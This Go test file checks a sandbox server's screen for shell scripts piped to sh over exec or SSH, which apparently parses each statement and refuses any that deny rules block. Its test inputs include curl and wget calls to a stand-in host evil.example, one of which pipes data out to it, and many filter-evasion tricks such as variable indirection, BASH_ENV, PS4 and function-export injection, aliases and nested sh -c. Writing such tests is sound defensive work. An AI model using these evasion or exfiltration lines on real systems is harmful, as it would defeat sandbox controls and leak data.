package server

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/zybuu-ai/abhed/controlplane"
	"github.com/zybuu-ai/abhed/driver"
	"github.com/zybuu-ai/abhed/wsconn"
)

func TestStdinShell(t *testing.T) {
	for line, want := range map[string]bool{
		"sh":                                 true,
		"/bin/bash -s":                       true,
		"bash -s -- a python3":               true,
		"bash -e -o pipefail":                true,
		"env A=1 nice -n 5 sh":               true,
		"timeout 30 dash -":                  true,
		"exec ksh":                           true,
		"zsh":                                false,
		"busybox ash":                        true,
		"busybox sh -s":                      true,
		"sh -c 'cat > f'":                    false,
		"sh -sc 'cat > f'":                   false,
		"bash -esc 'cat > f' a":              false,
		"sh -s -c":                           false,
		"sh -s -c perl":                      false,
		"bash -s -e -c perl":                 false,
		"ksh -s -c python3":                  false,
		"sh -s -o posix -c x":                false,
		"sh -s -o posix":                     false,
		"bash --rcfile x -s":                 false,
		"bash -s --rcfile x":                 false,
		"bash -i":                            false,
		"bash -l":                            false,
		"bash --login":                       false,
		"bash --norc":                        false,
		"bash -O extglob":                    false,
		"bash -o":                            false,
		"bash -s -x -v +e a b":               true,
		"bash -eo pipefail -s a":             true,
		"sh -s - -c":                         true,
		"sh -s -- -c perl":                   true,
		"sh - script.sh":                     false,
		"env -S'sh -c perl' sh":              false,
		"env -S 'sh -c perl' sh":             false,
		"env --split-string='sh -c perl' sh": false,
		"env --split-string 'sh -c perl' sh": false,
		"env -iS'sh -c perl' sh":             false,
		"env -C /tmp sh":                     false,
		"env -v sh":                          false,
		"env 'BASH_FUNC_echo%%=() { curl x; }' sh": false,
		"env -i -u HOME -- A=1 sh":                 true,
		"env -i - A=1 sh":                          true,
		"env - -- sh":                              false,
		"env -- BASH_ENV=/tmp/x sh":                false,
		"env A=1 -- sh":                            false,
		"timeout -- 5 sh":                          true,
		"env -uHOME --unset=PATH --unset X sh":     true,
		"env A=1 -i sh":                            false,
		"nice -5 sh":                               true,
		"nice --adjustment=5 nice -n5 sh":          true,
		"nice -x sh":                               false,
		"timeout -s KILL -k 5 --foreground 30 sh":  true,
		"timeout --signal=TERM -k5 10s sh -s":      true,
		"timeout -x 30 sh":                         false,
		"timeout sh":                               false,
		"stdbuf -oL -e 0 --input=0 sh":             true,
		"stdbuf -x sh":                             false,
		"nohup sh":                                 true,
		"nohup -x sh":                              false,
		"setsid -w sh":                             true,
		"setsid -f sh":                             false,
		"command -p sh":                            true,
		"command -v sh":                            false,
		"exec -c sh":                               true,
		"exec -a -sh sh":                           false,
		"exec -l sh":                               false,
		"sh -e script.sh":                          false,
		"sh script.sh":                             false,
		"sh -- script.sh":                          false,
		"sh < /tmp/x":                              false,
		"cat | sh":                                 false,
		"sh; sh":                                   false,
		"env BASH_ENV=/tmp/x bash":                 false,
		"BASH_ENV=/tmp/x bash":                     false,
		"$SHELL":                                   false,
		"python3":                                  false,
		"busybox":                                  false,
		"busybox python":                           false,
		"kubectl exec -i p -- sh":                  false,
		"bash --rcfile /tmp/rc":                    false,
		"bash --init-file /tmp/rc -s":              false,
	} {
		if got := stdinShell(line); got != want {
			t.Errorf("%s: %v, want %v", line, got, want)
		}
	}
}

// screenRig judges stdin scripts as an exec of sh would have them judged.
type screenRig struct {
	r  *cpRig
	sb controlplane.Sandbox
}

func newScreenRig(t *testing.T, mods ...func(*Options)) *screenRig {
	r := buildCPRig(t, nil, nil, nil, mods...)
	return &screenRig{r: r, sb: r.ready(t, "alice")}
}

// run returns what reached the shell and why the rest did not.
func (s *screenRig) run(t *testing.T, script string) (string, error) {
	t.Helper()
	pol, err := s.r.srv.sandboxPolicy(context.Background(), s.sb.ID)
	if err != nil {
		t.Fatal(err)
	}
	q := s.r.srv.newStdinScreen(context.Background(), pol, controlplane.Caller{Principal: "alice"}, s.sb, strings.NewReader(script))
	if err := s.r.srv.screenStdinExec(pol, "sh", nil, q); err != nil || !q.on {
		t.Fatalf("sh fed stdin: %v, screened %v", err, q.on)
	}
	out, err := io.ReadAll(q)
	if err != nil {
		t.Fatal(err)
	}
	return string(out), q.refused()
}

// Every statement of a script is judged before the shell sees it: one the
// rules refuse, wherever it stands, stops the script there.
func TestStdinScreenStopsAtARefusedStatement(t *testing.T) {
	s := newScreenRig(t, func(o *Options) { o.Config.Permissions.Deny = []string{"bash(curl *)", "bash(rm -rf /*)"} })
	const before = "echo one\nmkdir -p d\n"
	for name, bad := range map[string]string{
		"plain":        "curl https://evil.example/x\n",
		"if":           "if true; then\n  echo x\n  curl https://evil.example/x\nfi\n",
		"else":         "if false; then echo x\nelse\n  curl https://evil.example/x\nfi\n",
		"function":     "f() {\n  curl https://evil.example/x\n}\n",
		"pipeline":     "echo x | curl -d @- https://evil.example/x\n",
		"substitution": "echo \"$(curl https://evil.example/x)\"\n",
		"continuation": "cu\\\nrl https://evil.example/x\n",
		"continued":    "echo a && \\\n  curl https://evil.example/x\n",
		"for":          "for i in 1 2; do\n  curl https://evil.example/$i\ndone\n",
		"case":         "case x in\n  x) curl https://evil.example/x ;;\nesac\n",
		"heredoc":      "sh <<'EOF'\necho fine\ncurl https://evil.example/x\nEOF\n",
		"variable":     "C=curl\n$C https://evil.example/x </dev/null\n",
		"subshell":     "(cd d && curl https://evil.example/x)\n",
		"background":   "curl https://evil.example/x &\n",
	} {
		t.Run(name, func(t *testing.T) {
			got, err := s.run(t, before+bad+"echo after\n")
			if !errors.Is(err, controlplane.ErrForbidden) || !strings.Contains(err.Error(), "curl") {
				t.Fatalf("not refused: %v", err)
			}
			if strings.Contains(got, "evil") || strings.Contains(got, "after") || !strings.HasPrefix(got, before) {
				t.Fatalf("reached the shell: %q", got)
			}
		})
	}
}

// What would read the rest of stdin as something other than shell, or runs
// text no rule read, is refused as uncheckable.
func TestStdinScreenRefusesWhatCannotBeChecked(t *testing.T) {
	// An ask rule alone: these are refused by the screen itself, not by a
	// deny rule's own checks.
	s := newScreenRig(t, func(o *Options) { o.Config.Permissions.Deny, o.Config.Permissions.Ask = nil, []string{"bash(curl *)"} })
	for script, why := range map[string]string{
		"if then fi\n":                                    "cannot be parsed",
		"echo 'open\n":                                    "ended inside",
		"python3\nimport os\n":                            "python",
		"echo x; perl -e 1\n":                             "perl",
		"x=$(node)\n":                                     "node",
		"bash\necho hi\n":                                 "bash",
		"nice -n 5 ruby\n":                                "ruby",
		"docker exec -i c sh\n":                           "sh",
		"python3 <<'EOF'\nprint(1)\nEOF\n":                "here-document fed to python",
		"X=hi\nsh <<EOF\necho $X\nEOF\n":                  "built when it runs",
		"read -r line\neval \"$line\"\n":                  "eval",
		"cat > run.sh <<'EOF'\necho hi\nEOF\nsh run.sh\n": "run.sh, a file the script wrote",
		"echo 'echo hi' > x.sh\n. ./x.sh\n":               "x.sh, a file the script wrote",
		"printf 'x' | tee t.sh\nchmod +x t.sh\n./t.sh\n":  "t.sh, a file the script wrote",
		"source \"$F\"\n":                                 "named when it runs",
		"alias ls=curl\n":                                 "alias",
		"exec < /tmp/cmds\n":                              "new input",
		"exec 3<&0\n":                                     "copy of the shell's own input",
		"P=$(echo curl)\n\"$P\" x </dev/null\n":           "variable the script set",
		"$PROG\n":                                         "expansion",
		"export BASH_ENV=/tmp/x\n":                        "BASH_ENV",
		"PS4='$(id)'\n":                                   "PS4",
		"cat /dev/stdin | sh\n":                           "a shell reading its commands",
		"sh -c \"$(cat)\" </dev/null\n":                   "built when it runs",
		"f() { \"$1\" x </dev/null; }\n":                  "variable the script set",
		"F=$(mktemp)\necho 'curl x' > \"$F\"\nsh \"$F\" </dev/null\n": "named when it runs",
		"eval python3\n":                                 "python",
		"trap 'perl' DEBUG\n":                            "perl",
		"python3 /proc/$$/fd/0 </dev/null\n":             "own input",
		"cat > ls <<'EOF'\necho\nEOF\nPATH=.:$PATH ls\n": "ls, a file the script wrote",
		"env BASH_ENV=/tmp/x bash -c : </dev/null\n":     "BASH_ENV",
		"x\x00y\n": "NUL",
		"echo " + strings.Repeat("a", stdinStatementBytes) + "\n": "longer than",
	} {
		got, err := s.run(t, "echo first\n"+script+"echo after\n")
		if !errors.Is(err, controlplane.ErrForbidden) || !strings.Contains(err.Error(), why) {
			t.Errorf("%q: %v, want %q", script, err, why)
			continue
		}
		if strings.Contains(got, "after") || !strings.HasPrefix(got, "echo first\n") {
			t.Errorf("%q: reached the shell: %q", script, got)
		}
	}
}

// Scripts that do what an editor's remote setup does pass whole, under the
// default rules.
func TestStdinScreenPassesASetupScript(t *testing.T) {
	s := newScreenRig(t)
	got, err := s.run(t, setupScript)
	if err != nil || got != setupScript {
		t.Fatalf("%v\n%q", err, got)
	}
}

// setupScript is shaped like the script an editor sends to sh over SSH to
// put its server in place and start it.
const setupScript = `#!/bin/sh
set -e
COMMIT="0123abcd"
SERVER_DIR="$HOME/.editor-server/bin/$COMMIT"
SERVER_SCRIPT="$SERVER_DIR/bin/editor-server"
LOG="$SERVER_DIR/.log"
ARCH="$(uname -m)"
case "$ARCH" in
  x86_64 | amd64) PLATFORM=x64 ;;
  aarch64 | arm64) PLATFORM=arm64 ;;
  *) echo "unsupported: $ARCH"; exit 1 ;;
esac
if ! command -v tar >/dev/null 2>&1; then
  echo "tar is missing" >&2
  exit 1
fi
mkdir -p "$SERVER_DIR/bin"
if [ ! -f "$SERVER_DIR/payload.tar" ]; then
  mkdir -p "$SERVER_DIR/src/bin"
  printf 'payload\n' > "$SERVER_DIR/src/bin/readme.txt"
  tar -cf "$SERVER_DIR/payload.tar" -C "$SERVER_DIR/src" .
fi
tar -xf "$SERVER_DIR/payload.tar" -C "$SERVER_DIR" --no-same-owner
cat > "$SERVER_DIR/settings.json" <<'EOF'
{
  "telemetry": false,
  "platform": "unknown"
}
EOF
chmod 0644 "$SERVER_DIR/settings.json"
test -f "$SERVER_DIR/settings.json" && echo "settings written"
grep -c telemetry "$SERVER_DIR/settings.json" | sed 's/^/lines: /'
if [ -x "$SERVER_SCRIPT" ]; then
  "$SERVER_SCRIPT" --start-server --port 0 > "$LOG" 2>&1 &
else
  echo "ready for $PLATFORM"
fi
echo "done: $COMMIT"
`

// realShell runs each exec with /bin/sh in its own folder, fed its stdin.
func realShell(t *testing.T, r *cpRig) string {
	t.Helper()
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("no /bin/sh")
	}
	dir := t.TempDir()
	r.fake.ExecFunc = func(ctx context.Context, _ string, req driver.ExecRequest) (driver.ExecResult, error) {
		line, err := req.Line()
		if err != nil {
			return driver.ExecResult{}, err
		}
		cmd := exec.CommandContext(ctx, "/bin/sh", "-c", line)
		cmd.Dir, cmd.Env = dir, append(os.Environ(), "HOME="+dir)
		cmd.Stdin, cmd.Stdout, cmd.Stderr = req.Stdin, req.Stdout, req.Stderr
		err = cmd.Run()
		var ee *exec.ExitError
		if errors.As(err, &ee) {
			return driver.ExecResult{ExitCode: ee.ExitCode()}, nil
		}
		return driver.ExecResult{}, err
	}
	return dir
}

// execStdin runs command over the :exec WebSocket fed script, and returns
// how it ended.
func execStdin(t *testing.T, r *wsRig, id, command, script string) streamControl {
	t.Helper()
	ws, err := r.dial(t, "alice", "/v1/sandboxes/"+id+":exec", protoExec)
	if err != nil {
		t.Fatal(err)
	}
	defer ws.Close()
	b, _ := json.Marshal(map[string]string{"command": command})
	_ = ws.WriteMessage(wsconn.Text, b)
	if c, _ := control(t, ws); c.Type != "started" {
		return c
	}
	_ = ws.WriteMessage(wsconn.Binary, []byte(script))
	_ = ws.WriteMessage(wsconn.Text, []byte(`{"type":"eof"}`))
	c, _ := control(t, ws)
	return c
}

// A script piped to sh over :exec runs whole when every statement passes,
// and stops at the first refused one, under the server's rules and the
// caller's policy layer alike; each statement is recorded.
func TestSandboxExecStdinShellScreened(t *testing.T) {
	r := newWSRig(t, nil, nil, func(o *Options) {
		o.Config.Permissions.Deny = []string{"bash(curl *)"}
		o.SessionPolicy = func(context.Context, SessionPolicyRequest) (*PolicyLayer, error) {
			return &PolicyLayer{Name: "workspace pay", Deny: []string{"bash(wget *)"}}, nil
		}
	})
	dir := realShell(t, r.cpRig)
	sb := r.ready(t, "alice")

	c := execStdin(t, r, sb.ID, "sh", "touch one\nif true; then\n  touch two\nfi\nf() { touch three; }\nf\n")
	if c.Type != "exit" || c.Code == nil || *c.Code != 0 {
		t.Fatalf("passing script: %+v %+v", c, c.Error)
	}
	for _, f := range []string{"one", "two", "three"} {
		if _, err := os.Stat(filepath.Join(dir, f)); err != nil {
			t.Fatalf("%s was not made: %v", f, err)
		}
	}
	if ev := waitAudit(t, r.cpRig, sb.ID, "exec.input", controlplane.OutcomeOK); ev.Detail["statement"] == "" {
		t.Fatalf("statement record %+v", ev)
	}

	for name, bad := range map[string]string{
		"rule":  "touch before\nif true; then\n  curl https://evil.example/x\nfi\ntouch after\n",
		"layer": "touch before\nwget https://evil.example/x | cat\ntouch after\n",
		"parse": "touch before\nif then fi\ntouch after\n",
	} {
		_ = os.Remove(filepath.Join(dir, "before"))
		c := execStdin(t, r, sb.ID, "sh", bad)
		if c.Type != "error" || c.Error == nil || c.Error.Code != "forbidden" || !strings.Contains(c.Error.Message, "nothing after it ran") {
			t.Fatalf("%s: %+v %+v", name, c, c.Error)
		}
		if _, err := os.Stat(filepath.Join(dir, "before")); err != nil {
			t.Fatalf("%s: the statement before the refused one did not run", name)
		}
		if _, err := os.Stat(filepath.Join(dir, "after")); err == nil {
			t.Fatalf("%s: a statement after the refused one ran", name)
		}
		ev := waitAudit(t, r.cpRig, sb.ID, "exec.refused", controlplane.OutcomeFailed)
		if ev.Detail["statement"] == "" || ev.Detail["reason"] == "" {
			t.Fatalf("%s: refusal record %+v", name, ev)
		}
	}
	if ev := waitAudit(t, r.cpRig, sb.ID, "exec", controlplane.OutcomeFailed); ev.Code != "forbidden" {
		t.Fatalf("exec record %+v", ev)
	}
}

// An SSH exec of a shell, as ssh host sh < script runs, is screened the same.
func TestSandboxSSHExecShellScreened(t *testing.T) {
	r := newWSRig(t, nil, nil, func(o *Options) {
		o.Config.Permissions.Deny = []string{"bash(curl *)"}
		o.SandboxSSHKey = testHostKey(t)
	})
	dir := realShell(t, r.cpRig)
	sb := r.ready(t, "alice")
	client := sshClient(t, r, sb.ID)

	s, _ := client.NewSession()
	s.Stdin = strings.NewReader(setupScript)
	out, err := s.Output("sh")
	if err != nil || !strings.Contains(string(out), "done: 0123abcd") {
		t.Fatalf("setup script: %v %q", err, out)
	}
	if _, err := os.Stat(filepath.Join(dir, ".editor-server/bin/0123abcd/settings.json")); err != nil {
		t.Fatal(err)
	}

	s, _ = client.NewSession()
	var errOut bytes.Buffer
	s.Stderr = &errOut
	s.Stdin = strings.NewReader("touch before\ncurl https://evil.example/x\ntouch after\n")
	if err := s.Run("sh -s"); err == nil || !strings.Contains(errOut.String(), "refused") {
		t.Fatalf("ssh exec sh: %v %q", err, errOut.String())
	}
	if _, err := os.Stat(filepath.Join(dir, "after")); err == nil {
		t.Fatal("a statement after the refused one ran")
	}
	if _, err := os.Stat(filepath.Join(dir, "before")); err != nil {
		t.Fatal("the statement before the refused one did not run")
	}
}

// A variable the exec sets itself that a shell runs or reads on its own
// leaves no shell fed stdin to be judged statement by statement.
func TestStdinShellRefusedForItsOwnStartupVariables(t *testing.T) {
	s := newScreenRig(t, func(o *Options) { o.Config.Permissions.Deny = []string{"bash(curl *)"} })
	pol, err := s.r.srv.sandboxPolicy(context.Background(), s.sb.ID)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		command string
		env     []string
		names   string
	}{
		{"bash", []string{"BASH_ENV=/tmp/x"}, "BASH_ENV is set"},
		{"sh", []string{"ENV=/tmp/x"}, "ENV is set"},
		{"sh", []string{"MODE=1", "IFS=/"}, "IFS is set"},
		{"bash -s", []string{"PS4=$(curl x)", "SHELLOPTS=xtrace"}, "PS4 is set"},
		{"bash", []string{"BASH_FUNC_echo%%=() { curl x; }"}, "not an identifier"},
		{"sh", []string{"A-B=1"}, "not an identifier"},
		{"env IFS=/ sh", nil, "IFS"},
		{"IFS=/ sh", nil, "IFS"},
		{"env MODE=1 BASH_ENV=/x nice sh", nil, "BASH_ENV is set"},
	} {
		q := s.r.srv.newStdinScreen(context.Background(), pol, controlplane.Caller{Principal: "alice"}, s.sb, strings.NewReader("echo hi\n"))
		err := s.r.srv.screenStdinExec(pol, c.command, c.env, q)
		if !errors.Is(err, controlplane.ErrForbidden) || q.on || !strings.Contains(err.Error(), "cannot be checked") || !strings.Contains(err.Error(), c.names) {
			t.Errorf("%s with %q: %v, screened %v", c.command, c.env, err, q.on)
		}
	}
	q := s.r.srv.newStdinScreen(context.Background(), pol, controlplane.Caller{Principal: "alice"}, s.sb, strings.NewReader("echo hi\n"))
	if err := s.r.srv.screenStdinExec(pol, "sh", []string{"MODE=1"}, q); err != nil || !q.on {
		t.Fatalf("sh with a plain variable: %v, screened %v", err, q.on)
	}
}

// BASH_ENV and its kind run unjudged commands even for a judged bash -c, so
// under rules an exec may not set them; a plain variable it may.
func TestExecRefusesShellStartupVariablesUnderRules(t *testing.T) {
	for _, env := range []string{`"BASH_ENV=/tmp/x"`, `"ENV=/tmp/x"`, `"BASH_FUNC_echo%%=() { curl x; }"`, `"SHELLOPTS=xtrace"`, `"PS4=$(curl x)"`} {
		r := buildCPRig(t, nil, nil, nil, func(o *Options) { o.Config.Permissions.Deny = []string{"bash(curl *)"} })
		sb := r.ready(t, "alice")
		rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice",
			body: `{"command":"bash -c 'echo hi'","env":[` + env + `]}`})
		if rec.Code != http.StatusForbidden || r.fake.Calls("exec") != 0 {
			t.Fatalf("env %s: %d %s, %d execs", env, rec.Code, rec.Body.String(), r.fake.Calls("exec"))
		}
	}
	r := buildCPRig(t, nil, nil, nil, func(o *Options) { o.Config.Permissions.Deny = []string{"bash(curl *)"} })
	sb := r.ready(t, "alice")
	if rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice",
		body: `{"command":"bash -c 'echo hi'","env":["MODE=fast"]}`}); rec.Code != http.StatusOK || r.fake.Calls("exec") != 1 {
		t.Fatalf("a plain variable: %d %s", rec.Code, rec.Body.String())
	}
}

// A refusal for size or an open statement names the statement it stops at,
// the one after the last judged, in the client's error and the record.
func TestStdinScreenNumbersTheStatementItCutsShort(t *testing.T) {
	long := "echo " + strings.Repeat("a", 60000) + "\n"
	for name, c := range map[string]struct {
		script, why string
		want        int // 0: one after the statements recorded as judged
	}{
		"statement": {"echo one\necho two\necho " + strings.Repeat("a", stdinStatementBytes) + "\necho after\n", "statement is longer than", 3},
		"open":      {"echo one\necho 'open\n", "ended inside a statement", 2},
		"input":     {"echo one\n" + strings.Repeat(long, stdinScreenBytes/len(long)+2), "input is longer than", 0},
	} {
		t.Run(name, func(t *testing.T) {
			s := newScreenRig(t)
			_, err := s.run(t, c.script)
			if err == nil || !strings.Contains(err.Error(), c.why) {
				t.Fatalf("refusal: %v, want %q", err, c.why)
			}
			evs, _ := s.r.store.AuditFor(context.Background(), s.sb.ID)
			judged := 0
			for _, ev := range evs {
				if ev.Action == "exec.input" {
					judged++
				}
			}
			want := c.want
			if want == 0 {
				want = judged + 1
			} else if judged != want-1 {
				t.Fatalf("%d statements recorded as judged, want %d", judged, want-1)
			}
			if !strings.Contains(err.Error(), "statement "+strconv.Itoa(want)+" read from stdin") {
				t.Fatalf("the error numbers another statement than %d: %v", want, err)
			}
			if ev := waitAudit(t, s.r, s.sb.ID, "exec.refused", controlplane.OutcomeFailed); ev.Detail["n"] != strconv.Itoa(want) {
				t.Fatalf("the record numbers statement %s, want %d", ev.Detail["n"], want)
			}
		})
	}
}

// A shell's -c text in a statement is read as a script of its own, and the
// variables the exec and the command's own assignments set are known text,
// so a program named by either is judged by the rules it would otherwise
// pass; one named by a variable not known here, or one a child shell does
// not inherit, is refused, as on an exec.
// Under the server's rules and a caller's policy layer alike.
func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
	for name, mod := range map[string]func(*Options){
		"server rules": func(o *Options) {
			o.Config.Permissions.Deny = []string{"Bash(wget *)"}
			o.Config.Permissions.Ask = []string{"Bash(git push*)"}
		},
		"policy layer": func(o *Options) {
			o.SessionPolicy = func(context.Context, SessionPolicyRequest) (*PolicyLayer, error) {
				return &PolicyLayer{Name: "workspace pay", Deny: []string{"bash(wget *)"}, Ask: []string{"bash(git push*)"}}, nil
			}
		},
	} {
		t.Run(name, func(t *testing.T) {
			r := newWSRig(t, nil, nil, mod)
			r.fake.ExecFunc = func(_ context.Context, _ string, req driver.ExecRequest) (driver.ExecResult, error) {
				_, err := io.Copy(req.Stdout, req.Stdin)
				return driver.ExecResult{}, err
			}
			sb := r.ready(t, "alice")
			run := func(env []string, script string) streamControl {
				ws, err := r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":exec", protoExec)
				if err != nil {
					t.Fatal(err)
				}
				defer ws.Close()
				b, _ := json.Marshal(controlplane.ExecRequest{Command: "sh", Env: env})
				_ = ws.WriteMessage(wsconn.Text, b)
				if c, _ := control(t, ws); c.Type != "started" {
					t.Fatalf("%q: %+v", script, c)
				}
				_ = ws.WriteMessage(wsconn.Binary, []byte(script))
				_ = ws.WriteMessage(wsconn.Text, []byte(`{"type":"eof"}`))
				c, _ := control(t, ws)
				return c
			}
			for _, c := range []struct {
				env    []string
				script string
			}{
				{nil, "sh -c 'c=wget; $c https://evil.example/x' </dev/null\n"},
				{nil, "sh -c -x 'c=wget; $c https://evil.example/x' </dev/null\n"},
				{nil, "sh -c -- 'c=wget; $c https://evil.example/x' </dev/null\n"},
				{nil, "bash -xc -o pipefail -- 'c=wget; $c https://evil.example/x' </dev/null\n"},
				{nil, "bash -c '$(echo wget) https://evil.example/x' </dev/null\n"},
				{nil, "sh -ec 'c=git; $c push origin main' </dev/null\n"},
				{[]string{"W=wget"}, "$W https://evil.example/x </dev/null\n"},
				// The shell sets PWD itself, whatever the exec says.
				{[]string{"PWD=ls"}, "$PWD -la </dev/null\n"},
				{nil, "sh -c \"sh -c 'c=wget; \\$c https://evil.example/x'\" </dev/null\n"},
				{nil, "sh -c \"bash -c \\\"sh -c 'c=wget; \\\\\\$c https://evil.example/x'\\\"\" </dev/null\n"},
				// A child shell does not get a variable the script did not export.
				{nil, "export c=echo\nunset c\nc=echo\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
				{[]string{"c=echo"}, "unset c\nc=echo\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
				{nil, "export c=echo; declare +x c\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
				{nil, "c=echo; sh -c '$c wget https://evil.example/x' </dev/null\n"},
				{nil, "c=echo\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
				{nil, "c=echo\nbash -c '$c wget https://evil.example/x' </dev/null\n"},
				{nil, "c=echo\nsh <<'EOF'\n$c wget https://evil.example/x\nEOF\n"},
				{nil, "env c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
				{nil, "c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
				{nil, "env -i c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
				// A variable the image or the sandbox sets is not known here.
				{nil, "$IMAGEVAR https://evil.example/x </dev/null\n"},
				{nil, "sh -c '$IMAGEVAR https://evil.example/x' </dev/null\n"},
				{nil, "find . -exec sh -c 'c=wget; $c https://evil.example/x' \\; </dev/null\n"},
			} {
				if got := run(c.env, c.script); got.Type != "error" || got.Error == nil || got.Error.Code != "forbidden" {
					t.Errorf("%q with %q: %+v", c.script, c.env, got)
				}
			}
			if got := run([]string{"D=/tmp"}, "sh -c 'ls -la \"$D\"' </dev/null\nrm -rf build\nc=ls\n$c -la </dev/null\nexport e=ls\nsh -c '$e -la' </dev/null\n"); got.Type != "exit" {
				t.Fatalf("a readable script: %+v %+v", got, got.Error)
			}
		})
	}
}

// Shells' -c texts are read inside one another to a bound, and refused past it.
func TestStdinShellCodeDepthIsBounded(t *testing.T) {
	w := &scriptWalk{sc: newStdinScript(), depth: maxShellDepth - 1}
	if w.shellCode("sh", "ls", nil); w.why != "" {
		t.Fatalf("within the bound: %s", w.why)
	}
	w = &scriptWalk{sc: newStdinScript(), depth: maxShellDepth}
	if w.shellCode("sh", "ls", nil); !strings.Contains(w.why, "deep") {
		t.Fatalf("past the bound: %q", w.why)
	}
}
